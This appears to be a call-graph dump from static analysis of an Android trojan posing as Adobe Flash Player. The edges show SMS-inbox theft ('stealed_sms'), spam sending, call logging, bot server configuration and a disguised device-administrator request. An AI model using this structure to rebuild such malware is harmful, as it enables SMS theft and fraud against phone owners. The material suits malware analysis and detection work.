VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void onActivityResult(int,int,android.content.Intent)>($i0, $i1, $r1) in <com.adobe.flashplayer_.FlashARM: void onActivityResult(int,int,android.content.Intent)> ==> <android.app.Activity: void onActivityResult(int,int,android.content.Intent)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("keyHttpGate[") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r5 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r4 = virtualinvoke $r6.<com.adobe.flashplayer.Certificate: android.content.Context getApplicationContext()>() in <com.adobe.flashplayer.Certificate$2: void onClick(android.view.View)> ==> <android.content.ContextWrapper: android.content.Context getApplicationContext()>
SPECIAL edge: specialinvoke r0.<android.app.Service: void <init>()>() in <com.adobe.flashplayer_.AdobeZCore: void <init>()> ==> <android.app.Service: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("w", "NOFILTER", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void onCreate(android.os.Bundle)>($r1) in <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void onCreate(android.os.Bundle)>
VIRTUAL edge: $r4 = virtualinvoke $r6.<com.adobe.flashplayer.Certificate: android.content.Context getApplicationContext()>() in <com.adobe.flashplayer.Certificate$2: void onClick(android.view.View)> ==> <android.content.ContextWrapper: android.content.Context getApplicationContext()>
VIRTUAL edge: r30 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=stealed_sms&i=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, "getCalls:Executed:HTTP", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r3.<java.io.OutputStreamWriter: void write(java.lang.String)>($r2) in <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)> ==> <java.io.Writer: void write(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Boolean: java.lang.Boolean valueOf(boolean)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>(r2) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Package: ") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r13) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r25 = virtualinvoke $r19.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.packages.BK dummyMainMethod_com_adobe_packages_BK(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.packages.BK dummyMainMethod_com_adobe_packages_BK(android.content.Intent)>
SPECIAL edge: specialinvoke r5.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("MacrosAState", "E", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
SPECIAL edge: specialinvoke $r57.<java.io.File: void <init>(java.io.File,java.lang.String)>($r35, $r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: void <init>(java.io.File,java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("loadSpam") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Throwable: void <init>()>() in <java.lang.Exception: void <init>()> ==> <java.lang.Throwable: void <init>()>
STATIC edge: r30 = staticinvoke <com.adobe.flashplayer_.AdobeUtil: java.lang.String millisToDate(long)>($l4) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String millisToDate(long)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r5.<java.lang.String: int indexOf(java.lang.String)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: $r13 = specialinvoke r0.<com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotVer", $r1) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r21 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.ADOBEcoreZa: void onDisabled(android.content.Context,android.content.Intent)>(null, null) in <dummyMainClass: com.adobe.flashplayer_.ADOBEcoreZa dummyMainMethod_com_adobe_flashplayer___ADOBEcoreZa(android.content.Intent)> ==> <com.adobe.flashplayer_.ADOBEcoreZa: void onDisabled(android.content.Context,android.content.Intent)>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void <init>()>() in <com.adobe.flashplayer.Certificate: void <init>()> ==> <android.app.Activity: void <init>()>
VIRTUAL edge: $r4 = virtualinvoke $r3.<com.adobe.flashplayer.Certificate: android.content.Context getApplicationContext()>() in <com.adobe.flashplayer.Certificate$2: void onClick(android.view.View)> ==> <android.content.ContextWrapper: android.content.Context getApplicationContext()>
SPECIAL edge: $r13 = specialinvoke r0.<com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotVer", $r1) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r5 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.io.FileInputStream openFileInput(java.lang.String)>($r1) in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)> ==> <android.content.ContextWrapper: java.io.FileInputStream openFileInput(java.lang.String)>
SPECIAL edge: $r5 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("c", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.FlashY dummyMainMethod_com_adobe_flashplayer___FlashY(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.FlashY dummyMainMethod_com_adobe_flashplayer___FlashY(android.content.Intent)>
STATIC edge: $r2 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("Hello, fuckin AVs!") in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("macros") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashW: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("package", $r5, $r1) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r25 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r12) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r55.<java.lang.StringBuffer: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: void <init>()>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("callBlock[") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(";") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r8 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r2 = virtualinvoke r0.<com.adobe.flashplayer_.ADOBEcoreZa: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.ADOBEcoreZa: void onEnabled(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.ADOBEcoreZa: android.content.Intent getIntent()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=doubled_sms&i=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r20, "calls.txt", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("MacrosAData_") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<com.adobe.flashplayer_.MacrosStat$1: void <init>(com.adobe.flashplayer_.MacrosStat,long,long)>(r0, 180000L, 180000L) in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <com.adobe.flashplayer_.MacrosStat$1: void <init>(com.adobe.flashplayer_.MacrosStat,long,long)>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotPhone") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("remoteSD") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>("Reich_SMSGate", r1) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void close()>() in <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void close()>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>($r21, r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.String: boolean contains(java.lang.CharSequence)>("A") in <com.adobe.flashplayer_.AdobeUtil: void execMod(java.lang.String,android.content.Context)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=macros_a_good&i=macros_a_data") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r30 = staticinvoke <android.net.Uri: android.net.Uri parse(java.lang.String)>("content://sms/inbox") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.net.Uri: android.net.Uri parse(java.lang.String)>
VIRTUAL edge: $r9 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke $r2.<android.content.Intent: android.content.Intent addFlags(int)>(67108864) in <com.adobe.flashplayer_.ADOBEcoreZa: java.lang.CharSequence onDisableRequested(android.content.Context,android.content.Intent)> ==> <android.content.Intent: android.content.Intent addFlags(int)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("sendSMS") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r20.<java.lang.String: int length()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>(r4, "spamlist.txt", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>
STATIC edge: $r21 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)>(null) in <dummyMainClass: com.adobe.flashplayer_.FlashARM dummyMainMethod_com_adobe_flashplayer___FlashARM(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.AdobeFlashCore: void onDestroy()>() in <dummyMainClass: com.adobe.flashplayer_.AdobeFlashCore dummyMainMethod_com_adobe_flashplayer___AdobeFlashCore(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeFlashCore: void onDestroy()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r5, $r17, $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer.Certificate: boolean requestWindowFeature(int)>(1) in <com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)> ==> <android.app.Activity: boolean requestWindowFeature(int)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r24 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("spam_data", r4, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer_.adobeCore: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r2.<android.content.Intent: void <init>(java.lang.String)>("android.settings.SETTINGS") in <com.adobe.flashplayer.Certificate$1: void onClick(android.view.View)> ==> <android.content.Intent: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r4.<java.lang.String: int indexOf(java.lang.String)>("stop") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
STATIC edge: r25 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
STATIC edge: r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r2 = specialinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)>("Reich_ServerGate") in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)>
SPECIAL edge: specialinvoke $r5.<com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)>($r1, "ON") in <com.adobe.flashplayer_.adobeCore: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: virtualinvoke $r2.<android.content.Intent: android.content.Intent setFlags(int)>(1073741824) in <com.adobe.flashplayer_.ADOBEcoreZa: java.lang.CharSequence onDisableRequested(android.content.Context,android.content.Intent)> ==> <android.content.Intent: android.content.Intent setFlags(int)>
SPECIAL edge: specialinvoke $r52.<com.adobe.flashplayer_.FlashVars: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVars: void <init>()>
VIRTUAL edge: virtualinvoke r2.<android.content.Intent: android.content.Intent putExtra(java.lang.String,java.lang.String)>("android.app.extra.ADD_EXPLANATION", "FLASH_PLUGIN_INSTALLATION\n\n\u0423\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u0438 \u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0430\u0446\u0438\u044f \u043a\u043e\u043c\u043f\u043e\u043d\u0435\u043d\u0442\u043e\u0432 com.adobe.flashplayer.\n\n\u041c\u043e\u0434\u0443\u043b\u044c \u0431\u0443\u0434\u0435\u0442 \u0437\u0430\u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0438\u0440\u043e\u0432\u0430\u043d \u043a\u0430\u043a Adobe Flash Player.\n\nFor get more information about us, please visit http://adobe.com.") in <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)> ==> <android.content.Intent: android.content.Intent putExtra(java.lang.String,java.lang.String)>
